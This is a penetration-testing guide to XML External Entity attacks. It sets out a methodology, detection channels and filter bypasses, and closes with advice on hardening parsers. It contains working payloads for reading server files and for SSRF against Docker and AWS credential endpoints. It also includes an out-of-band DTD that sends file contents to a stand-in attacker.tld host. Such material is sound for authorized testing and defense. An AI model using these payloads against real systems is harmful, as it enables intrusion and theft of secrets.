# XML EXTERNAL ENTITY (XXE)

## Critical

XXE is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

## Scope

- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification
- Injection surfaces: REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office), PDF generators, build/report pipelines, config importers
- Transclusion: XInclude and XSLT document() loading external resources

## Methodology

1. Inventory all XML consumers: endpoints, upload parsers, background jobs, CLI tools, converters, and third-party SDKs.
2. Start with capability probes: does the parser accept DOCTYPE? resolve external entities? allow network access? support XInclude/XSLT?
3. Establish a quiet oracle (error shape, length/ETag diffs, OAST callbacks), then escalate to targeted file/SSRF payloads.
4. Validate per-channel parity: the same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs.

## Discovery Techniques

### Surface Map

- File uploads: SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives, Android/iOS plist, project config imports
- Protocols: SOAP/XML-RPC/WebDAV/SAML (ACS endpoints), RSS/Atom feeds, server-side renderers and converters
- Hidden paths: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude" parameters; processing-instruction headers

### Capability Probes

- Minimal DOCTYPE: attempt a harmless internal entity to detect acceptance without causing side effects
- External fetch test: point to an OAST URL to confirm egress; prefer DNS first, then HTTP
- XInclude probe: add xi:include to see if transclusion is enabled
- XSLT probe: xml-stylesheet PI or transform endpoints that accept stylesheets

## Detection Channels

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### Oast

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Advanced Techniques

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content; works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

- Effective where entity resolution is blocked but XInclude remains enabled in the pipeline

### XSLT Document

- XSLT processors can fetch external resources via document():

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

- Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers

## Protocol Wrappers

- Java: jar:, netdoc:
- PHP: php://filter, expect:// (when module enabled)
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Filter Bypasses

### Encoding Variants

- UTF-16/UTF-7 declarations, mixed newlines, CDATA and comments to evade naive filters

### Doctype Variants

- PUBLIC vs SYSTEM, mixed case <!DoCtYpE>, internal vs external subsets, multi-DOCTYPE edge handling

### Network Controls

- If network blocked but filesystem readable, pivot to local file disclosure; if files blocked but network open, pivot to SSRF/OAST

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude; test ACS endpoints with minimal probes

### Svg And Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML; attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML; insert payloads into document.xml, rels, or drawing XML and repackage

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT).
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence.
3. Confirm blind channels with OAST and correlate to the triggering request.
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths).
5. Bound impact: exact files/data reached or internal targets proven.

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Impact

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Pro Tips

1. Prefer OAST first; it is the quietest confirmation in production-like paths.
2. When content is sanitized, use error-based and length/ETag diffs.
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled.
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts.
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly.
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS.
7. Test background processors separately; they often use different parser settings.
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE.
9. Combine with path traversal and deserialization where XML touches downstream systems.
10. Document exact parser behavior per stack; defenses must match real libraries and flags.

## Remember

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.
